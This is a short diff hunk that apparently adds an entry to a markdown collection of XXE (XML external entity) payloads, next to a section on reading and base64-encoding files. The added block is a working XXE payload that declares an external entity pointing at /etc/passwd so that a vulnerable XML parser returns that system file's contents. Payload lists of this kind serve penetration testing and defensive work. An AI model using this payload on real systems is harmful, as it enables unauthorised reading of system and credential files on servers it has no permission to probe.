@@ -11,6 +11,15 @@
 </post>
 ```
 
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+```
+
 ### Read a file and base64 encode it for display
 
 ```xml
